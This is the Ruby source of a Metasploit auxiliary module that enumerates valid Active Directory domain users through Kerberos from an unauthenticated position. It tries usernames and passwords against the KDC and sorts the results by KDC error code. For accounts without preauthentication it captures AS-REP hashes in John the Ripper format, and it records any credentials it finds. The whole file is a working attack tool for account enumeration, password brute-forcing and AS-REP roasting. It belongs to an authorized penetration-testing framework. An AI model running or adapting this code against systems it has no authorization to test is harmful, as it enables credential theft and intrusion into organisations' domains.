##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/kerberos'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Domain User Enumeration',
        'Description' => %q{
          This module will enumerate valid Domain Users via Kerberos from an unauthenticated perspective. It utilizes
          the different responses returned by the service for valid and invalid users.
        },
        'Author' => [
          'Matt Byrne <attackdebris[at]gmail.com>', # Original Metasploit module
          'alanfoster' # Enhancements
        ],
        'References' => [
          ['URL', 'https://nmap.org/nsedoc/scripts/krb5-enum-users.html']
        ],
        'License' => MSF_LICENSE
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 20])
      ]
    )
  end

  def run
    domain = datastore['DOMAIN'].upcase
    print_status("Using domain: #{domain} - #{peer}...")

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
      realm:  domain,
      nil_passwords: true
    )
    scanner = ::Metasploit::Framework::LoginScanner::Kerberos.new(
      host: self.rhost,
      port: self.rport,
      server_name: "krbtgt/#{domain}",
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: datastore['ConnectTimeout'],
      framework: framework,
      framework_module: self,
    )

    scanner.scan! do |result|
      user = result.credential.public
      password = result.credential.private
      peer = result.host
      proof = result.proof

      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        hash = format_as_rep_to_john_hash(proof.as_rep)

        # Accounts that have 'Do not require Kerberos preauthentication' enabled, will receive an ASREP response with a
        # ticket present without requiring a password
        if password.nil?
          print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
        else
          print_good("#{peer} - User found: #{user.inspect} with password #{password}. Hash: #{hash}")
        end

        report_cred(user: user, password: password, asrep: hash)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_error("#{peer} - User: #{user.inspect} - Unable to connect - #{proof}")

      when Metasploit::Model::Login::Status::INCORRECT, Metasploit::Model::Login::Status::INCORRECT_PUBLIC_PART
        if proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_WRONG_REALM
          print_error("#{peer} - User: #{user.inspect} - #{proof.error_code}. Domain option may be incorrect. Aborting...")
          # Stop further requests entirely
          break
        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
          print_good("#{peer} - User: #{user.inspect} is present")
          report_cred(user: user)
        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_FAILED
          if password.nil?
            print_good("#{peer} - User: #{user.inspect} is present")
            report_cred(user: user)
          else
            vprint_status("#{peer} - User: #{user.inspect} wrong password #{password}")
          end
        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CLIENT_REVOKED
          print_error("#{peer} - User: #{user.inspect} account disabled or locked out")
        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_C_PRINCIPAL_UNKNOWN
          vprint_status("#{peer} - User: #{user.inspect} user not found")
        else
          vprint_status("#{peer} - User: #{user.inspect} - #{proof.error_code}")
        end
      end
    end
  end

  def report_cred(opts)
    domain = datastore['DOMAIN'].upcase

    service_data = {
      address: rhost,
      port: rport,
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      service_name: 'kerberos',
      realm_key: ::Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }

    credential_data = {
      username: opts[:user],
      origin_type: :service,
      module_fullname: fullname
    }.merge(service_data)

    # TODO: Confirm if we should store both passwords and asrep accounts as two separate logins or not
    if opts[:password]
      credential_data.merge!(
        private_data: opts[:password],
        private_type: :password
      )
    elsif opts[:asrep]
      credential_data.merge!(
        private_data: opts[:asrep],
        private_type: :nonreplayable_hash,
        jtr_format: 'krb5'
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
